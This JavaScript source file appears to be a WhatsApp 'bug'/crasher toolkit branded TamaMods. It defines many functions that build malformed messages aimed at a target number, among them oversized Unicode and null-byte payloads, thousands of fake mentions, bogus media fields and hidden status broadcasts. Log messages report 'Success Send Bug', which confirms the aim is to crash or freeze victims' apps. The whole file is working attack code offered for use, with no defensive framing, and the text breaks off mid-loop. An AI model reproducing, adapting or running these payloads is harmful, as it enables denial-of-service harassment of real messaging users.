async function LottieHome2(target) {
  const msg = generateWAMessageFromContent(target, {
   lottieStickerMessage: {
    message: {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
        fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
        fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
        mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
        mimetype: "application/was",
        height: 512,
        width: 512,
        directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
        fileLength: "14390",
        mediaKeyTimestamp: "1760786856",
        isAnimated: true,
        stickerSentTs: "1760786855983",
        isAvatar: false,
        isAiSticker: false,
        isLottie: true
      }
    }
  }
}, {});

  await TamaMods.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function Excation(TamaMods, target) {
  let Xeca = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "᬴".repeat(88888),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(888888),
            version: 3
          },
          contextInfo: {
            participant: target,
            isForwarded: true,
            forwardingScore: 8888,
            forwardedNewsletterMessageInfo: {
              newsletterName: "᬴".repeat(88888),
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            conversionSource: "facebook_ads",
            conversionData: "{\"fb_campaign_id\":\"9999\",\"fb_ad_id\":\"9999\"}",
            conversionDelayMs: "9999",
            mentionedJid: [
              "@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

  await TamaMods.relayMessage("status@broadcast", Xeca.message, {
    messageId: Xeca.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
  await new Promise(resolve => setTimeout(resolve, 5000));
}
async function InteractiveUILoad(target) {
 try {
   const UiLoads = "𑜦𑜠".repeat(18000) + "ི꒦ྀ".repeat(18000) + "ꦾ".repeat(18000) + "ꦽ".repeat(18000);
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: "TamaMods"
              },
            },
            body: {
              text: "TamaaMods" + UiLoads,
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: UiLoads,
                    id: null 
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://Wa.me/stickerpack/TamaaModss"
                })
                }
              ]
            }
          }
        }
      }
    }, {})

    await TamaMods.relayMessage(target, msg.message, {
      messageId: msg.key.id
    })
  } catch (err) {
    console.error('Error:', err)
  }
}
async function InVisible(TamaMods, target) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "EXPDSD",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () =>
                                `1${Math.floor(Math.random() * 900000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".TamaMods" + "ꦽ".repeat(1000),
                                    title: "ZnX",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://t.me/rizxvelzexct",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await TamaMods.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });
    console.log(chalk.green("Success Send Bug By TamaMods 🐉"));
    await new Promise(resolve => setTimeout(resolve, 5000));
}
async function xUi(TamaMods, target) {
        const Interactive = {
                viewOnceMessage: {
                        message: {
                                interactiveMessage: {
                                        contextInfo: {
                                                remoteJid: "EXPODSD",
                                                stanzaId: "666",
                                                participant: target,
                                                mentionedJid: [
                                                        "0@s.whatsapp.net",
                                                        ...Array.from({ length: 1900 }, () =>
                                                                "1" + Math.floor(Math.random() * 10000000) + "@s.whatsapp.net"
                                                        ),
                                                ],
                                                quotedMessage: {
                                                        paymentInviteMessage: {
                                                                serviceType: 3,
                                                                expiryTimestamp: Date.now() + 1814400000,
                                                        },
                                                        forwardedAiBotMessageInfo: {
                                                                botName: "META AI",
                                                                botJid:
                                                                        Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                                                creatorName: "Bot",
                                                        },
                                                },
                                        },
                                        body: {
                                                text: " #TamaModss. " + "ꦽ".repeat(100000),
                                        },
                                        nativeFlowMessage: {
                                                buttons: [
                                                        {
                                                                name: "galaxy_message",
                                                                buttonParamsJson: JSON.stringify({
                                                                        icon: "REVIEW",
                                                                        flow_cta: "#TamaMods." + "ꦽ".repeat(66666),
                                                                        flow_message_version: "3",
                                                                }),
                                                        },
                                                ],
                                                messageParamsJson: "{",
                                        },
                                },
                        },
                },
        };

        await TamaMods.relayMessage(target, Interactive, {
                messageId: null,
                userJid: target,
        });
}
async function bulldozerr(TamaMods, target, mention) {
        let message = {
                viewOnceMessage: {
                        message: {
                                stickerMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                        mimetype: "image/webp",
                                        directPath:
                                                "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                        fileLength: { low: 1, high: 0, unsigned: true },
                                        mediaKeyTimestamp: {
                                                low: 1746112211,
                                                high: 0,
                                                unsigned: false,
                                        },
                                        firstFrameLength: 19904,
                                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                        isAnimated: true,
                                        contextInfo: {
                                                mentionedJid: [
                                                        "13135550002@s.whatsapp.net",
                                                        ...Array.from(
                                                                {
                                                                        length: 1950,
                                                                },
                                                                () =>
                                                                        "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net"
                                                        ),
                                                ],
                                                groupMentions: [],
                                                entryPointConversionSource: "non_contact",
                                                entryPointConversionApp: "whatsapp",
                                                entryPointConversionDelaySeconds: 467593,
                                        },
                                        stickerSentTs: {
                                                low: -1939477883,
                                                high: 406,
                                                unsigned: false,
                                        },
                                        isAvatar: false,
                                        isAiSticker: false,
                                        isLottie: false,
                                },
                        },
                },
        };

        const msg = generateWAMessageFromContent(target, message, {});
        if (!msg.key || !msg.key.id) {
                msg.key = {
                        remoteJid: target,
                        fromMe: true,
                        id: (Math.random() * 1e16).toString(36)
                };
        }

        await TamaMods.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                        {
                                tag: "meta",
                                attrs: {},
                                content: [
                                        {
                                                tag: "mentioned_users",
                                                attrs: {},
                                                content: [
                                                        {
                                                                tag: "to",
                                                                attrs: { jid: target },
                                                                content: undefined,
                                                        },
                                                ],
                                        },
                                ],
                        },
                ],
        });
        console.log(chalk.green("Success Send Bug By TamaModss🐉"))
        await new Promise(resolve => setTimeout(resolve, 8500));
}
async function InviteBlank(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: " ⃟✭./Tamaa. ✦╶►" + "ꦾ".repeat(100000) + "ꦽ".repeat(30000),
      caption: " ⃟✭./Tamaa. ✦╶►" + "ꦾ".repeat(100000) + "ꦽ".repeat(30000),
      inviteExpiration: "999999999"
    }
  };

  await TamaMods.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
  console.log(chalk.red(`Successfully Sending Bug Ke ${target}`))
        await new Promise(resolve => setTimeout(resolve, 8500));
}
async function BlankGroup(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: " ⃟✭./Tamaa. ✦╶►" + "ꦾ".repeat(100000) + "ꦽ".repeat(30000),
      caption: " ⃟✭Tamaa. ✦╶►" + "ꦾ".repeat(100000) + "ꦽ".repeat(30000),
      jpegThumbnail: null, 
      contextInfo: {
      participant: target,
      mentionedJid: [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1950 }, () =>
        "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
         ),
       ],
       remoteJid: "X",
       stanzaId: "123",
       quotedMessage: {
       paymentInviteMessage: {
       serviceType: 3,
 expiryTimestamp: Date.now() + 1814400000,
      },
      forwardedAiBotMessageInfo: {
        botName: "TamaCrasherAi",
        botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        creatorName: "Bot",
       },
      },
    },
   }
  };
  await TamaMods.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
  console.log(chalk.red(`Successfully Sending Bug Ke ${target}`))
        await new Promise(resolve => setTimeout(resolve, 8500));
}
async function LocBlankOriginal(target) {
const LocSmg = {
    viewOnceMessage: {
       message: {
        locationMessage: {
         degreesLatitude: 290311,
         degreesLongitude: 250208,
         name: "Tama - Here" + "ꦾ".repeat(50000),
         address: "Tama Superiot" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
         contextInfo: {
           mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
            externalAdReply: {
              body: "Tama - Is Here",
               mediaType: 1,
                thumbnail: null,
                sourceUrl: "https://t.me/TamaCrasher",
                sourceType: "whatsapp",
                cdogio: 'cdogio' + Math.floor(Math.random() * 1000000),
                sourceId: String(Math.floor(Math.random() * 900000000) + 100000),
                ctwaClid: 'clid' + Math.floor(Math.random() * 1000000),
                ctaPayload: 'payload' + Math.random().toString(36).substring(2, 10),
                ref: "referencia",
                mediaType: 1,
                clickToWhatsappCall: true,
                adContextPreviewDismissed: false,
                sourceApp: "com.whatsapp",
               automatedGreetingMessageShown: true,
                greetingMessageBody: "x",
                disableNudge: true,
                originalImageUrl: "https://t.me/TamaCrasher"
              }
            }
          }
        }
      }
   };

 await TamaMods.relayMessage(target, LocSmg, {
  participant: { jid: target }, 
  messageId: null
  })
  console.log(chalk.red(`Successfully Sending Bug Ke ${target}`))
        await new Promise(resolve => setTimeout(resolve, 8500));
}
async function veldana(target) {
  let kir = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "TamaModss" + "\u0000".repeat(3500),
              hasMediaAttachment: true,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                caption: "Akira" + "\u0000".repeat(1000),
                fileLength: "9999999999999",
                height: 99999999,
                width: 999999,
                mediaKey: "756755566555566",
                fileSha256: "eMRrcup+JPA9i9oCmQJ76AOj0a46preT/pSdBnHEBDs=",
                fileEncSha256: "qtMbOk3R+lz1BFAoL32bTGlJDlHAF96ADMOEcbANI3Q=",
                directPath:
                  "/v/t62.7119-24/10000000_796692563089708_355304506673586600_n.enc?ccb=11-4&oh=01_Q5Aa2wENjvJefhEXovRFLFpYTWBClRbPMDy2Gu91XoGc5YkakA&oe=69141396&_nc_sid=5e03e0",
                mediaKeyTimestamp: "146774",
                jpegThumbnail: Buffer.from([]),
              },
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                ), 
              ], 
              forwardingScore: 1000,
              isForwarded: true,
            },
            caption: "Shalltear",
            contentText: "Shalltear",
            footerText: "Shalltear",
            interactiveMessage: {
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(5000),
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                      display_text: "𑜦𑜠".repeat(10000),
                      id: null,
                    }),
                  },
                  {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                      display_text: "𑜦𑜠".repeat(10000),
                      id: null,
                    }),
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "𑜦𑜠".repeat(10000),
                      url: "https://" + "𑜦𑜠".repeat(10000) + ".com",
                    }),
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: JSON.stringify({
                      display_text: "𑜦𑜠".repeat(10000),
                      copy_code: "𑜦𑜠".repeat(10000),
                    }),
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "PROMOTION",
                      flow_cta: "haay",
                      flow_message_version: "3"
                    })
                  }
                ]
              }
            }
          }
        }
      }
    },
    { participant: target }
  );

  await TamaMods.relayMessage(target, kir.message, { messageId: kir.key.id });
}
async function LottieSticker(TamaMods, target) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
          fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
          fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
          mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
          mimetype: "application/was",
          height: 512,
          width: 512,
          directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
          fileLength: "14390",
          mediaKeyTimestamp: "1760786856",
          isAnimated: true,
          stickerSentTs: Date.now().toString(),
          isAvatar: false,
          isAiSticker: true,
          isLottie: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "6287888888888-1234567890@g.us",
          serverMessageId: 1,
          newsletterName: " X ",
          contentType: "UPDATE",
          accessibilityText: " X "
        },
        contextInfo: {
          forwardingScore: 555,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: '!Tama - 𝗋34🩸',
            body: "https://rule34.com",
            previewType: "VIDEO",
            mediaType: "VIDEO",
            thumbnail: { url: "https://k.top4top.io/p_3579z4ral1.jpg" },
            sourceUrl: "t.me/rizxvelzexct",
            mediaUrl: "t.me/rizxvelzexct",
            sourceType: " x ",
            sourceId: " x ",
            containsAutoReply: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          annotations: [
            {
              polygonVertices: [{ x: 25022008, y: -25022008 }],
              newsletter: {
                newsletterJid: target,
                newsletterName: "Tama - X",
                serverMessageId: 999,
                contentType: "UPDATE",
                accessibilityText: "X"
              }
            }
          ]
        },
        messageParamsJson: JSON.stringify({
          version: "1.0",
          author: "Tamaa",
          theme: "lottie-r34",
          timestamp: Date.now(),
          info: "auto-generated LottieSticker"
        })
      }
    }
  };

  await TamaMods.relayMessage(target, message, {});
}
async function LocBlank2(target) {
const LocSmg = {
    viewOnceMessage: {
       message: {
        locationMessage: {
         degreesLatitude: 290311,
         degreesLongitude: 250208,
         name: "Tama - Here" + "ꦾ".repeat(50000),
         address: "Tama Superiot" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
         contextInfo: {
           mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
            externalAdReply: {
              body: "Tama - Is Here",
               mediaType: 1,
                thumbnail: null,
                sourceUrl: "https://t.me/TamaCrasher",
                sourceType: "whatsapp",
                cdogio: 'cdogio' + Math.floor(Math.random() * 1000000),
                sourceId: String(Math.floor(Math.random() * 900000000) + 100000),
                ctwaClid: 'clid' + Math.floor(Math.random() * 1000000),
                ctaPayload: 'payload' + Math.random().toString(36).substring(2, 10),
                ref: "referencia",
                mediaType: 1,
                clickToWhatsappCall: true,
                adContextPreviewDismissed: false,
                sourceApp: "com.whatsapp",
               automatedGreetingMessageShown: true,
                greetingMessageBody: "x",
                disableNudge: true,
                originalImageUrl: "https://t.me/TamaCrasher"
              }
            }
          }
        }
      }
   };

        const msg = generateWAMessageFromContent("status@broadcast", LocSmg, {})

  await TamaMods.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target })
  console.log(chalk.red(`Successfully Sending Bug Ke ${target}`))
        await new Promise(resolve => setTimeout(resolve, 8500));
}
async function RblClickV2(TamaMods, target) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, stickerPayload, {});

  if (Math.random() > 0.5) {
    await TamaMods.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } else {
    await TamaMods.relayMessage(target, msg.message, { messageId: msg.key.id });
  }
}
async function DelayBjir(target) {
  try {
    const AimBot = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: 9.999999,
            degreesLongitude: -9.999999,
            name: "⎋🦠</🧬⃟༑⌁⃰TamaMods\\>🍷𞋯" + "\u0000".repeat(88888),
            address: "\u0000".repeat(5555),
            contextInfo: {
              mentionedJid: Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
              isSampled: true,
              participant: target,
              remoteJid: target,
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    };

    const AimBot2 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "⎋🦠</🧬⃟༑⌁⃰TamaMods\\>🍷𞋯",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            }
          }
        }
      }
    };

    const AimBot3 = {
      extendedTextMessage: {
        text:
          "⎋🦠</🧬⃟༑⌁⃰TamaMods\\>🍷𞋯" +
          "\u0000".repeat(299986),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    };

    const msg1 = generateWAMessageFromContent(target, AimBot, {});
    await TamaMods.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const msg2 = generateWAMessageFromContent(target, AimBot2, {});
    await TamaMods.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const msg3 = generateWAMessageFromContent(target, AimBot3, {});
    await TamaMods.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("BJIR ERROR COK😡🗿:", err);
  }
}
async function Delaythumb(target) {
const BlankP = "𑜦𑜠".repeat(18000) + "ི꒦ྀ".repeat(18000) + "ꦾ".repeat(18000) + "ꦽ".repeat(2500) + "ោ៝".repeat(2500);
const msg = generateWAMessageFromContent(target, {
   viewOnceMessage: {
     message: {
      imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/530946339_807053005498728_4953946451152343806_n.enc?ccb=11-4&oh=01_Q5Aa2wEyeoY3daRbzSWXMc-vUUzBntMP2RQjaN4qWTvIpwTyng&oe=691FCCC1&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      caption: "TamaModss" + BlankP,
      fileSha256: "GqznXqROjk10gdaV0DeqgYjM8WIPY7HhQl6cLj1fAkE=",
      fileLength: "83240",
      height: 850,
      width: 1280,
      mediaKey: "BwnJHaW1CFM15aGmfhjgo6KiJ+B3O4LRSPG8CZ1/0xI=",
      fileEncSha256: "RyxkaoZyDkm6ncUwp9ECE55NwT+v6lBgnXOLrSqfOCM=",
      directPath: "/v/t62.7118-24/530946339_807053005498728_4953946451152343806_n.enc?ccb=11-4&oh=01_Q5Aa2wEyeoY3daRbzSWXMc-vUUzBntMP2RQjaN4qWTvIpwTyng&oe=691FCCC1&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1761111571",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzIABcUnWxNh3UMAdFyL3+Z6p6ndtnIr2suawtpE1ymQCuCd06OUcitkQWiyfEWA1x/8QAKRAAAgICAQMCBQUAAAAAAAAAAQIAAwQREhMhMQUQFCAiMlIjQVFigv/aAAgBAQABPwD56sW+7ZSsmX4r44Bcj5Ex7XBIEI0Zh4q5LEF+MKYlJIUGwj9zK8xKsUHkBs9gsyOnZp7C3fwPYUMwHHuYmNaW0NblPp/MAvYYKakL1pSCFHdjDcaamFaKP7Rne1tE+TKa6XG30ErWX5NYBWtP9GV1UrsBOUy1dUBDBR+Inp1uMEHNDzHkwcD9o7QVp9Z/KZOO954ovFBFqpr5nqryXxAQE4l98jsmW/DWFU6nHU+KqA7Idzqo7b4GKa6g3BCSYb8kH72E62WAf1GhuymGi7QIxMYOO+veuwIDOssNq7EWxfG4bBuC5f4jWBlI37f/xAAcEQEAAgIDAQAAAAAAAAAAAAABABEQUQIgITH/2gAIAQIBAT8A6nMWKy80HwnupbqW6x//xAAeEQACAgICAwAAAAAAAAAAAAABAgARAxIQISAyUv/aAAgBAwEBPwDwqNgdFtqERQZqBfO7OadzUK466eaY/qaY69u+P//Z",
      contextInfo: {
      mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
         ]
      },
      scansSidecar: "Bqpjp6Grf6ovBexFePHSK/mzm5G3CFaFY04QUQz21gS/JM3HU8bElQ==",
      scanLengths: [
      9922,
      39852,
      13726,
      19740 
      ],
     midQualityFileSha256: "85uJolWgLSkzjLYJLxny/2+aCWJng0weK1n32uHG/wk="
    }
   }
  }
 }, { userJid: target});
 
 for (let i = 0; i < 100; i++) {
